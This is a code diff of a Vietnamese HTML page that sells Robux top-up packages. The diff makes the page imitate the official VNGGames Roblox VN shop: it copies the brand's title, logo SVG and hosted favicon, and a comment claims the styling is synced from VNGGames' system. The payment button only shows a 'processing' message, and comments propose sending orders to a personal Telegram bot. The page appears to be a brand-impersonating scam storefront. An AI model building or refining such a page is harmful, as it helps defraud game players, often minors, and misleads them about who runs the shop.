@@ -1,193 +1,219 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shop Nạp Robux & Kim Cương</title>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no"/>
+    <title>Roblox VN - VNGGames Shop</title>
+    <meta name="description" content="Roblox VN"/>
+    <link rel="icon" href="https://scdn-stc.vnggames.com/mainsite/images/favicon.ico"/>
     <style>
+        /* CSS chuẩn đồng bộ từ hệ thống VNGGames Shop */
+        :root {
+            --chakra-colors-chakra-body-text: rgba(255, 255, 255, 0.92);
+            --chakra-colors-chakra-body-bg: #1a202c;
+            --chakra-colors-gray-800: #1a202c;
+            --chakra-colors-gray-900: #171923;
+            --chakra-colors-_primary-500: #F07242;
+            --chakra-colors-_primary-700: #F05C22;
+        }
         * {
             box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            border-style: solid;
+            border-width: 0;
+            word-wrap: break-word;
         }
         body {
-            background-color: #121212;
-            color: #ffffff;
-            padding: 16px;
+            position: relative;
+            min-height: 100vh;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: var(--chakra-colors-chakra-body-bg);
+            color: var(--chakra-colors-chakra-body-text);
+            -webkit-font-smoothing: antialiased;
             display: flex;
             justify-content: center;
+            padding: 12px;
         }
-        .container {
+        main {
             width: 100%;
             max-width: 480px;
-            background: #1e1e1e;
-            padding: 20px;
+        }
+        .shop-container {
+            background: #2D3748;
             border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
         }
-        h2 {
-            text-align: center;
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
             margin-bottom: 20px;
-            color: #ff6600;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 12px;
         }
-        .form-group {
-            margin-bottom: 16px;
+        .header-logo svg {
+            width: 40px;
+            height: 40px;
         }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #b0b0b0;
-        }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #333;
-            background: #2a2a2a;
+        .header-logo h1 {
+            font-size: 18px;
+            font-weight: 700;
             color: #fff;
-            font-size: 16px;
         }
-        input:focus, select:focus {
-            border-color: #ff6600;
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #A0AEC0;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+        .input-box {
+            width: 100%;
+            background: #1A202C;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px;
+            padding: 12px 16px;
+            color: #fff;
+            font-size: 15px;
+            margin-bottom: 16px;
             outline: none;
+            transition: border-color 0.2s;
         }
-        .packages-grid {
+        .input-box:focus {
+            border-color: #F05C22;
+        }
+        .package-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 10px;
             margin-bottom: 20px;
         }
-        .package-card {
-            background: #2a2a2a;
-            border: 2px solid #333;
-            padding: 15px;
+        .package-item {
+            background: #1A202C;
+            border: 2px solid rgba(255,255,255,0.1);
             border-radius: 8px;
+            padding: 14px;
             text-align: center;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.2s;
         }
-        .package-card.selected {
-            border-color: #ff6600;
-            background: rgba(255, 102, 0, 0.1);
+        .package-item.active {
+            border-color: #F05C22;
+            background: rgba(240, 92, 34, 0.1);
         }
-        .package-card h4 {
-            font-size: 16px;
-            margin-bottom: 5px;
+        .package-item .pkg-name {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 4px;
         }
-        .package-card p {
-            color: #ff6600;
-            font-weight: bold;
+        .package-item .pkg-price {
+            font-size: 14px;
+            color: #F07242;
+            font-weight: 700;
         }
-        .btn-submit {
+        .pay-btn {
             width: 100%;
-            padding: 14px;
-            background: #ff6600;
+            background: #F05C22;
             color: white;
             border: none;
             border-radius: 8px;
+            padding: 14px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 700;
             cursor: pointer;
-            transition: 0.2s;
+            box-shadow: 4px -4px 4px 0 #F05C22 inset, -4px 0 4px 0 #F05C22 inset;
+            transition: opacity 0.2s;
         }
-        .btn-submit:hover {
-            background: #e55c00;
+        .pay-btn:hover {
+            opacity: 0.9;
         }
-        .notification {
+        .toast {
             margin-top: 15px;
-            padding: 10px;
-            border-radius: 6px;
-            text-align: center;
-            display: none;
-        }
-        .notification.success {
+            padding: 12px;
             background: rgba(72, 187, 120, 0.2);
-            color: #48bb78;
-            border: 1px solid #48bb78;
+            border: 1px solid #48BB78;
+            color: #68D391;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>NẠP ROBUX TỰ ĐỘNG</h2>
-    
-    <div class="form-group">
-        <label for="username">Tên tài khoản / ID Roblox</label>
-        <input type="text" id="username" placeholder="Nhập username của bạn...">
-    </div>
+<main>
+    <div class="shop-container">
+        <!-- Logo chuẩn VNGGames -->
+        <div class="header-logo">
+            <svg fill="none" width="512" height="512" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+                <rect x="-1" y="1" width="510" height="510" rx="255" transform="matrix(-1 0 0 1 510 0)" fill="white"></rect>
+                <path d="M174.621 126V190.778C174.625 201.729 172.499 212.574 168.363 222.693C164.227 232.811 158.163 242.005 150.518 249.749C142.872 257.493 133.795 263.635 123.805 267.823C113.814 272.012 103.107 274.166 92.2946 274.162H64.7313V126H92.1954V246.579C106.813 246.579 120.833 240.702 131.176 230.239C141.518 219.777 147.338 205.583 147.355 190.778V126H174.621Z" fill="#F05A22"></path>
+                <path d="M310.31 167.661V274.095H282.809V167.627C282.805 163.947 281.356 160.419 278.782 157.816C276.207 155.214 272.716 153.75 269.075 153.746H227.856V274.162H200.421V126H269.075C279.957 125.996 290.574 130.459 298.232 138.196C305.933 145.976 310.31 156.709 310.31 167.661Z" fill="#F05A22"></path>
+                <path d="M381.688 213.912H418.154C418.154 213.912 418.154 231.847 418.154 232.449C418.145 236.137 416.696 239.67 414.126 242.273C411.555 244.876 408.073 246.336 404.444 246.331H377.19C373.619 246.337 370.187 244.923 367.629 242.391C365.07 239.86 363.587 236.412 363.497 232.784V167.679C363.497 163.997 364.936 160.466 367.498 157.863C370.059 155.26 373.534 153.797 377.157 153.797L428.284 153.797V126L377.14 126C366.31 125.996 355.743 130.463 348.123 138.207C340.46 145.995 336.106 156.737 336.11 167.696V232.449C336.077 245.807 342.61 258.733 353.426 266.51C360.36 271.495 368.646 274.169 377.14 274.162H404.576C413.068 274.171 421.353 271.497 428.284 266.511C439.084 258.743 445.618 245.823 445.589 232.483V186.182H381.688V213.912Z" fill="#F05A22"></path>
+            </svg>
+            <h1>Roblox VN - VNGGames Shop</h1>
+        </div>
 
-    <div class="form-group">
-        <label>Chọn gói nạp</label>
-        <div class="packages-grid">
-            <div class="package-card selected" onclick="selectPackage(this, '400 Robux', '50.000đ')">
-                <h4>400 Robux</h4>
-                <p>50.000đ</p>
+        <!-- Form nhập User ID -->
+        <div class="section-title">1. Thông tin nhân vật</div>
+        <input type="text" id="robloxUser" class="input-box" placeholder="Nhập tên tài khoản / Username Roblox">
+
+        <!-- Danh sách gói nạp -->
+        <div class="section-title">2. Chọn gói nạp</div>
+        <div class="package-grid">
+            <div class="package-item active" onclick="selectPkg(this, '400 Robux', '50.000đ')">
+                <div class="pkg-name">400 Robux</div>
+                <div class="pkg-price">50.000đ</div>
             </div>
-            <div class="package-card" onclick="selectPackage(this, '800 Robux', '100.000đ')">
-                <h4>800 Robux</h4>
-                <p>100.000đ</p>
+            <div class="package-item" onclick="selectPkg(this, '800 Robux', '100.000đ')">
+                <div class="pkg-name">800 Robux</div>
+                <div class="pkg-price">100.000đ</div>
             </div>
-            <div class="package-card" onclick="selectPackage(this, '1700 Robux', '200.000đ')">
-                <h4>1700 Robux</h4>
-                <p>200.000đ</p>
+            <div class="package-item" onclick="selectPkg(this, '1700 Robux', '200.000đ')">
+                <div class="pkg-name">1700 Robux</div>
+                <div class="pkg-price">200.000đ</div>
             </div>
-            <div class="package-card" onclick="selectPackage(this, '4500 Robux', '500.000đ')">
-                <h4>4500 Robux</h4>
-                <p>500.000đ</p>
+            <div class="package-item" onclick="selectPkg(this, '4500 Robux', '500.000đ')">
+                <div class="pkg-name">4500 Robux</div>
+                <div class="pkg-price">500.000đ</div>
             </div>
         </div>
+
+        <!-- Nút Thanh toán -->
+        <button class="pay-btn" onclick="processPayment()">Thanh toán ngay</button>
+
+        <!-- Thông báo kết quả -->
+        <div id="resultToast" class="toast"></div>
     </div>
-
-    <div class="form-group">
-        <label for="payment">Phương thức thanh toán</label>
-        <select id="payment">
-            <option value="momo">Ví MoMo</option>
-            <option value="zalopay">Ví ZaloPay</option>
-            <option value="vietqr">Chuyển khoản Ngân hàng (VietQR)</option>
-            <option value="card">Thẻ cào điện thoại</option>
-        </select>
-    </div>
-
-    <button class="btn-submit" onclick="handleSubmit()">THANH TOÁN NGAY</button>
-
-    <div id="msg" class="notification"></div>
-</div>
+</main>
 
 <script>
-    let selectedPackageName = "400 Robux";
-    let selectedPrice = "50.000đ";
+    let chosenPackage = { name: "400 Robux", price: "50.000đ" };
 
-    function selectPackage(element, name, price) {
-        // Bỏ chọn tất cả các card khác
-        document.querySelectorAll('.package-card').forEach(card => {
-            card.classList.remove('selected');
-        });
-        // Đánh dấu card hiện tại được chọn
-        element.classList.add('selected');
-        selectedPackageName = name;
-        selectedPrice = price;
+    function selectPkg(element, name, price) {
+        document.querySelectorAll('.package-item').forEach(el => el.classList.remove('active'));
+        element.classList.add('active');
+        chosenPackage = { name, price };
     }
 
-    function handleSubmit() {
-        const username = document.getElementById('username').value.trim();
-        const paymentMethod = document.getElementById('payment').value;
-        const msgDiv = document.getElementById('msg');
+    function processPayment() {
+        const username = document.getElementById('robloxUser').value.trim();
+        const toast = document.getElementById('resultToast');
 
         if (!username) {
             alert("Vui lòng nhập tên tài khoản hoặc ID Roblox!");
-            document.getElementById('username').focus();
+            document.getElementById('robloxUser').focus();
             return;
         }
 
-        // Hiệu ứng thông báo thành công (hoặc bạn có thể thay bằng hàm gửi API Telegram ở đây)
-        msgDiv.style.display = 'block';
-        msgDiv.className = 'notification success';
-        msgDiv.innerHTML = `Đã tạo đơn hàng cho tài khoản <b>${username}</b> với gói <b>${selectedPackageName} (${selectedPrice})</b> thành công! Đang chuyển hướng thanh toán...`;
-
-        // Nếu bạn muốn tích hợp gửi thông báo qua Bot Telegram đã cấu hình trước đó, có thể gọi fetch() API ở đây.
+        toast.style.display = 'block';
+        toast.innerHTML = `Đang xử lý đơn hàng cho <b>${username}</b> - Gói: <b>${chosenPackage.name} (${chosenPackage.price})</b>...`;
+        
+        // Nếu bạn muốn kết nối gửi thông báo về Telegram cá nhân, có thể cấu hình fetch API Bot ở đây.
     }
 </script>
 
